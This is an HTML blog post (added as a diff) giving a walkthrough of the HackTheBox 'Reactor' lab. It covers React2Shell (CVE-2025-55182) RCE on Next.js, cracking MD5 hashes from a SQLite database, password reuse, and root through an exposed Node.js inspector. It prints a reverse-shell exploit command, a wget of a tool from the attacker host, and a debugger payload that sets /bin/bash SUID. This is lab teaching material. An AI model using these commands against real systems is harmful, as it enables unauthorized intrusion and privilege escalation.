@@ -1,0 +1,237 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta name="description" content="HackTheBox Reactor (Linux, Easy) — unauthenticated RCE via React2Shell (CVE-2025-55182) on Next.js, MD5 hash cracking for password reuse, and privilege escalation through an exposed Node.js debugger port.">
+
+  <meta http-equiv="Content-Security-Policy" content="default-src 'none'; script-src 'self' 'sha256-tPqkbt4ef+MNL3m5ZYl3N2iuh38+p5F+QuOpBiXqN2g=' https://www.googletagmanager.com; style-src 'self' https://fonts.googleapis.com; font-src https://fonts.gstatic.com; img-src 'self' data: https://www.google-analytics.com; connect-src 'self' https://www.google-analytics.com https://*.google-analytics.com https://*.analytics.google.com; frame-src 'none'; object-src 'none'; base-uri 'self'; form-action 'none';">
+  <meta http-equiv="Cache-Control" content="no-cache, must-revalidate">
+  <meta http-equiv="Pragma" content="no-cache">
+
+  <!-- Open Graph -->
+  <meta property="og:type"        content="article">
+  <meta property="og:site_name"   content="onecybit">
+  <meta property="og:title"       content="Reactor — onecybit">
+  <meta property="og:description" content="HackTheBox Reactor (Linux, Easy) — unauthenticated RCE via React2Shell (CVE-2025-55182) on Next.js, MD5 hash cracking for password reuse, and privilege escalation through an exposed Node.js debugger port.">
+  <meta property="og:url"         content="https://onecybit.github.io/posts/cybersecurity/ctf/reactor/">
+  <meta property="og:image"       content="https://onecybit.github.io/assets/img/OneCyBit_logo_compressed.jpg">
+  <meta name="twitter:card"        content="summary_large_image">
+  <meta name="twitter:title"       content="Reactor — onecybit">
+  <meta name="twitter:description" content="HackTheBox Reactor (Linux, Easy) — unauthenticated RCE via React2Shell (CVE-2025-55182) on Next.js, MD5 hash cracking for password reuse, and privilege escalation through an exposed Node.js debugger port.">
+
+  <script type="application/ld+json">{"@context":"https://schema.org","@type":"Article","headline":"Reactor","datePublished":"2026-09-14","description":"HackTheBox Reactor (Linux, Easy) — unauthenticated RCE via React2Shell (CVE-2025-55182) on Next.js, MD5 hash cracking for password reuse, and privilege escalation through an exposed Node.js debugger port.","url":"https://onecybit.github.io/posts/cybersecurity/ctf/reactor/","author":{"@type":"Person","name":"onecybit"}}</script>
+
+  <title>Reactor — onecybit</title>
+
+  <link rel="canonical" href="https://onecybit.github.io/posts/cybersecurity/ctf/reactor/">
+  <link rel="alternate" type="application/rss+xml" title="onecybit" href="https://onecybit.github.io/feed.xml">
+  <link rel="icon" type="image/x-icon" href="/assets/img/favicons/favicon.ico">
+  <link rel="stylesheet" href="/assets/css/style.css">
+
+  <!-- Google Analytics -->
+  <script async src="https://www.googletagmanager.com/gtag/js?id=G-L2TK63YC14"></script>
+  <script>window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments);}gtag('js',new Date());gtag('config','G-L2TK63YC14');</script>
+</head>
+
+<body>
+
+  <div class="scroll-progress" aria-hidden="true"></div>
+
+  <!-- ── SHARED: update all pages if this changes ── -->
+  <header class="site-header">
+    <nav class="nav container" role="navigation" aria-label="Main navigation">
+      <a href="/" class="nav-logo" aria-label="onecybit — home">
+        <span class="nav-logo-text">onecybit<span class="nav-logo-dot">.</span></span>
+      </a>
+
+      <ul class="nav-links" id="js-nav-links" role="list">
+        <li><a href="/"               class="nav-link">Home</a></li>
+        <li><a href="/cybersecurity/" class="nav-link">Cybersecurity</a></li>
+        <li><a href="/projects/"      class="nav-link">Projects</a></li>
+        <li><a href="/news/"          class="nav-link">News</a></li>
+        <li><a href="/notes/"         class="nav-link">Notes</a></li>
+        <li><a href="/tags/"          class="nav-link">Tags</a></li>
+        <li><a href="/about.html"     class="nav-link">About</a></li>
+      </ul>
+
+      <button class="nav-hamburger" id="js-nav-hamburger" aria-label="Open navigation menu" aria-expanded="false" aria-controls="js-nav-links">
+        <span class="nav-hamburger-bar" aria-hidden="true"></span>
+        <span class="nav-hamburger-bar" aria-hidden="true"></span>
+        <span class="nav-hamburger-bar" aria-hidden="true"></span>
+      </button>
+
+    </nav>
+  </header>
+
+  <main>
+    <article class="section" aria-label="Reactor">
+      <div class="container post-full">
+
+        <header class="post-full-header">
+          <nav class="post-breadcrumb" aria-label="Breadcrumb">
+            <a href="/">home</a>
+            <span class="post-breadcrumb-sep" aria-hidden="true">/</span>
+            <a href="/cybersecurity/">cybersecurity</a>
+            <span class="post-breadcrumb-sep" aria-hidden="true">/</span>
+            <a href="/cybersecurity/ctf/">ctf</a>
+          </nav>
+
+          <div class="post-full-meta">
+            <time class="post-date" datetime="2026-09-14">2026-09-14</time>
+            <a class="cat-badge cat-badge--writeup" href="/cybersecurity/ctf/">ctf</a>
+            <span class="reading-time">3 min read</span>
+          </div>
+
+          <h1 class="post-full-title">Reactor</h1>
+
+          <ul class="post-full-tags post-tags" aria-label="Tags">
+            <li><a class="post-tag" href="/tags/htb/">htb</a></li><li><a class="post-tag" href="/tags/reactor/">reactor</a></li><li><a class="post-tag" href="/tags/linux/">linux</a></li><li><a class="post-tag" href="/tags/easy/">easy</a></li><li><a class="post-tag" href="/tags/nextjs/">nextjs</a></li><li><a class="post-tag" href="/tags/rce/">rce</a></li><li><a class="post-tag" href="/tags/hash-cracking/">hash-cracking</a></li><li><a class="post-tag" href="/tags/node-inspector/">node-inspector</a></li>
+          </ul>
+        </header>
+
+        
+
+        <div class="post-body">
+          <blockquote><p><strong>OS</strong>: Linux | <strong>Difficulty</strong>: Easy | <strong>IP</strong>: 10.129.95.38 <strong>Started</strong>: 2026-09-14 | <strong>Rooted</strong>: 2026-09-14 | <strong>Status</strong>: Completed</p></blockquote>
+<hr>
+<h2 id="summary">Summary</h2>
+<p>Reactor is an easy Linux box. There's a Next.js app on port 3000 that's vulnerable to React2Shell (CVE-2025-55182), so you get code execution as the <code>node</code> user without logging in. The app ships a SQLite database full of MD5 password hashes. The <code>engineer</code> hash cracks to <code>reactor1</code>, and the same password works for the system account. For root, there's a Node.js process running as root with the debugger port open on localhost, so you attach to it and tell it to make <code>/bin/bash</code> SUID.</p>
+<h2 id="recon">Recon</h2>
+<p>Full port scan:</p>
+<div class="code-block"><button class="copy-btn" aria-label="Copy code">copy</button><pre><code class="language-bash">sudo nmap -Pn -p- -sC -sV -T4 -oN nmap-scan.txt 10.129.95.38
+</code></pre></div>
+<p>Two ports: SSH on 22 and a web app on 3000. The headers give the stack away:</p>
+<div class="code-block"><button class="copy-btn" aria-label="Copy code">copy</button><pre><code class="language-bash">curl -sI http://10.129.95.38:3000/
+</code></pre></div>
+<div class="code-block"><button class="copy-btn" aria-label="Copy code">copy</button><pre><code>HTTP/1.1 200 OK
+X-Powered-By: Next.js
+x-nextjs-cache: HIT
+</code></pre></div>
+<p>Wappalyzer showed the exact version, Next.js 15.0.3, which is in range for CVE-2025-55182.</p>
+<h2 id="foothold-react2shell-cve-2025-55182">Foothold: React2Shell (CVE-2025-55182)</h2>
+<p>Next.js server actions deserialize request data without checking it properly, so one crafted POST gets you RCE as whatever user runs the app. No auth needed.</p>
+<p>I used the Chocapikk PoC to confirm it first:</p>
+<div class="code-block"><button class="copy-btn" aria-label="Copy code">copy</button><pre><code class="language-bash">python3 -m venv venv &amp;&amp; source venv/bin/activate
+pip install -r requirements.txt
+
+python3 exploit.py -u http://10.129.95.38:3000/ -c &quot;ls&quot;
+</code></pre></div>
+<div class="code-block"><button class="copy-btn" aria-label="Copy code">copy</button><pre><code>app
+next.config.js
+node_modules
+package.json
+reactor.db
+</code></pre></div>
+<p>Then a reverse shell:</p>
+<div class="code-block"><button class="copy-btn" aria-label="Copy code">copy</button><pre><code class="language-bash">python3 exploit.py -u http://10.129.95.38:3000/ -r -l 10.10.16.201 -p 4445 -P nc-mkfifo
+</code></pre></div>
+<p>That drops a shell as <code>node</code>. Upgrade it so it's actually usable:</p>
+<div class="code-block"><button class="copy-btn" aria-label="Copy code">copy</button><pre><code class="language-bash">python3 -c &#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;
+export TERM=xterm
+# Ctrl+Z
+stty raw -echo; fg
+stty rows 54 columns 209
+</code></pre></div>
+<h2 id="getting-to-engineer">Getting to engineer</h2>
+<p>The <code>reactor.db</code> file is the interesting bit:</p>
+<div class="code-block"><button class="copy-btn" aria-label="Copy code">copy</button><pre><code class="language-bash">sqlite3 reactor.db
+sqlite&gt; .tables
+sensor_logs  users
+sqlite&gt; select * from users;
+1|admin|a203b22191d744a4e70ada5c101b17b8|administrator|admin@reactor.htb
+2|engineer|39d97110eafe2a9a68639812cd271e8e|operator|engineer@reactor.htb
+</code></pre></div>
+<p>Plain MD5, no salt. rockyou cracks the engineer one straight away:</p>
+<div class="code-block"><button class="copy-btn" aria-label="Copy code">copy</button><pre><code class="language-bash">hashcat -m 0 39d97110eafe2a9a68639812cd271e8e /usr/share/wordlists/rockyou.txt
+# 39d97110eafe2a9a68639812cd271e8e:reactor1
+</code></pre></div>
+<p>Password is <code>reactor1</code>, and it's reused for the system user:</p>
+<div class="code-block"><button class="copy-btn" aria-label="Copy code">copy</button><pre><code class="language-bash">su engineer   # reactor1
+</code></pre></div>
+<h2 id="user-flag">User flag</h2>
+<div class="code-block"><button class="copy-btn" aria-label="Copy code">copy</button><pre><code class="language-bash">engineer@reactor:~$ cat user.txt
+# &lt;redacted&gt;
+</code></pre></div>
+<h2 id="root-exposed-node-debugger">Root: exposed Node debugger</h2>
+<p>Checking what root is running:</p>
+<div class="code-block"><button class="copy-btn" aria-label="Copy code">copy</button><pre><code class="language-bash">ps aux | grep root
+root  1289  ... /usr/bin/node --inspect=127.0.0.1:9229 /opt/uptime-monitor/worker.js
+</code></pre></div>
+<p>The <code>--inspect</code> flag opens the V8 debugger. Anything that can reach that port can run JavaScript inside the process, and this process runs as root. It's bound to localhost, but I'm already on the box, so that doesn't help them.</p>
+<p>Pull websocat over, find the debugger's websocket URL, then send it one command:</p>
+<div class="code-block"><button class="copy-btn" aria-label="Copy code">copy</button><pre><code class="language-bash">wget http://10.10.16.201/websocat &amp;&amp; chmod +x websocat
+curl -s http://127.0.0.1:9229/json    # returns webSocketDebuggerUrl with a UUID
+</code></pre></div>
+<div class="code-block"><button class="copy-btn" aria-label="Copy code">copy</button><pre><code class="language-bash">echo &#x27;{&quot;id&quot;:1,&quot;method&quot;:&quot;Runtime.evaluate&quot;,&quot;params&quot;:{&quot;expression&quot;:&quot;process.mainModule.require(\&quot;child_process\&quot;).execSync(\&quot;chmod +s /bin/bash\&quot;).toString()&quot;}}&#x27; \
+  | ./websocat ws://127.0.0.1:9229/876bb34f-73ac-488e-b5d4-60401c458902
+</code></pre></div>
+<p>Check bash is SUID now, then drop into a root shell:</p>
+<div class="code-block"><button class="copy-btn" aria-label="Copy code">copy</button><pre><code class="language-bash">ls -la /bin/bash
+# -rwsr-sr-x 1 root root ... /bin/bash
+bash -p
+</code></pre></div>
+<h2 id="root-flag">Root flag</h2>
+<div class="code-block"><button class="copy-btn" aria-label="Copy code">copy</button><pre><code class="language-bash">bash-5.2# cat /root/root.txt
+# &lt;redacted&gt;
+</code></pre></div>
+<h2 id="credentials">Credentials</h2>
+<table><thead><tr><th>User</th><th>Secret</th><th>Source</th></tr></thead><tbody><tr><td>engineer</td><td>reactor1 (cracked MD5)</td><td>reactor.db</td></tr><tr><td>admin</td><td>MD5 hash, didn't crack</td><td>reactor.db</td></tr></tbody></table>
+<h2 id="attack-chain">Attack chain</h2>
+<div class="code-block"><button class="copy-btn" aria-label="Copy code">copy</button><pre><code>Next.js 15.0.3 on port 3000
+  │
+  ▼
+React2Shell (CVE-2025-55182) → RCE as node, no auth
+  │
+  ▼
+reactor.db → MD5 hashes → crack engineer to reactor1
+  │
+  ▼
+su engineer (password reuse) → user flag
+  │
+  ▼
+Node --inspect debugger on 127.0.0.1:9229, running as root
+  │
+  ▼
+Runtime.evaluate over websocket → chmod +s /bin/bash
+  │
+  ▼
+bash -p → root flag
+</code></pre></div>
+<h2 id="references">References</h2>
+<ul><li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-55182" target="_blank" rel="noopener noreferrer">CVE-2025-55182 — Next.js Server Actions Deserialization RCE (React2Shell)</a></li><li><a href="https://nodejs.org/en/learn/getting-started/debugging#security-implications" target="_blank" rel="noopener noreferrer">Node.js Debugger —  IC0  Security Warning</a></li></ul>
+        </div>
+
+        <nav class="post-nav" aria-label="Post navigation">
+          <a class="post-nav-item post-nav-item--prev" href="/posts/cybersecurity/ctf/wingdata-writeup/"><span class="post-nav-label">← older</span><span class="post-nav-title">WingData</span></a>
+          
+        </nav>
+
+      </div>
+    </article>
+
+  <section class="related-posts section" aria-label="Related posts"><div class="container"><h2 class="section-title">// related posts</h2><div class="related-posts-grid"><article class="post-item" data-category="cybersecurity" data-subcategory="ctf"><div class="post-meta"><time class="post-date" datetime="2026-05-09">2026-05-09</time><a class="cat-badge cat-badge--writeup" href="/cybersecurity/ctf/">ctf</a></div><h3 class="post-title"><a href="/posts/cybersecurity/ctf/wingdata-writeup/">WingData</a></h3><p class="post-excerpt">HackTheBox WingData (Linux, Medium) — Wing FTP CVE-2025-47812 unauthenticated RCE, static-salt SHA-256 cracking, and a Python tarfile PATH_MAX symlink bypass for root.</p><ul class="post-tags" aria-label="Tags"><li><a class="post-tag" href="/tags/htb/">htb</a></li><li><a class="post-tag" href="/tags/wingdata/">wingdata</a></li><li><a class="post-tag" href="/tags/linux/">linux</a></li><li><a class="post-tag" href="/tags/medium/">medium</a></li><li><a class="post-tag" href="/tags/ftp/">ftp</a></li><li><a class="post-tag" href="/tags/rce/">rce</a></li><li><a class="post-tag" href="/tags/hash-cracking/">hash-cracking</a></li><li><a class="post-tag" href="/tags/tarfile/">tarfile</a></li></ul></article><article class="post-item" data-category="cybersecurity" data-subcategory="ctf"><div class="post-meta"><time class="post-date" datetime="2026-04-24">2026-04-24</time><a class="cat-badge cat-badge--writeup" href="/cybersecurity/ctf/">ctf</a><span class="season-badge">season 10</span></div><h3 class="post-title"><a href="/posts/cybersecurity/ctf/facts/">HackTheBox — Facts</a></h3><p class="post-excerpt">HackTheBox Facts machine recon — nginx, MinIO, and Camaleon CMS on Ubuntu. Full writeup restricted while machine is active.</p><ul class="post-tags" aria-label="Tags"><li><a class="post-tag" href="/tags/htb/">htb</a></li><li><a class="post-tag" href="/tags/ctf/">ctf</a></li><li><a class="post-tag" href="/tags/cms/">cms</a></li><li><a class="post-tag" href="/tags/linux/">linux</a></li></ul></article><article class="post-item" data-category="cybersecurity" data-subcategory="cheatsheets"><div class="post-meta"><time class="post-date" datetime="2026-05-01">2026-05-01</time><a class="cat-badge cat-badge--cheatsheet" href="/cybersecurity/cheatsheets/">cheatsheets</a></div><h3 class="post-title"><a href="/posts/cybersecurity/cheatsheets/kali-hardening-script/">Kali Linux Hardening</a></h3><p class="post-excerpt">An annotated MIT-licensed Bash script that hardens a fresh Kali install — firewall, fail2ban, rkhunter, ClamAV, and a Lynis audit.</p><ul class="post-tags" aria-label="Tags"><li><a class="post-tag" href="/tags/kali/">kali</a></li><li><a class="post-tag" href="/tags/linux/">linux</a></li><li><a class="post-tag" href="/tags/hardening/">hardening</a></li><li><a class="post-tag" href="/tags/ufw/">ufw</a></li><li><a class="post-tag" href="/tags/fail2ban/">fail2ban</a></li><li><a class="post-tag" href="/tags/clamav/">clamav</a></li><li><a class="post-tag" href="/tags/lynis/">lynis</a></li></ul></article></div></div></section>
+
+  </main>
+
+  <footer class="site-footer">
+    <div class="container footer-inner">
+      <span class="footer-copy">&copy; 2026 onecybit</span>
+      <nav class="footer-links" aria-label="Footer">
+        <a href="/cybersecurity/" class="footer-link">Cybersecurity</a>
+        <a href="/projects/"      class="footer-link">Projects</a>
+        <a href="/tags/"          class="footer-link">Tags</a>
+        <a href="/about.html"     class="footer-link">About</a>
+        <a href="/feed.xml"       class="footer-link">RSS</a>
+        <a href="https://github.com/onecybit" class="footer-link" target="_blank" rel="noopener noreferrer">GitHub</a>
+      </nav>
+    </div>
+  </footer>
+
+  <button class="back-to-top" id="js-back-top" aria-label="Back to top" hidden>↑</button>
+
+  <script src="/assets/js/main.js" defer></script>
+  <script src="/assets/js/protected.js" defer></script>
+
+</body>
+</html>
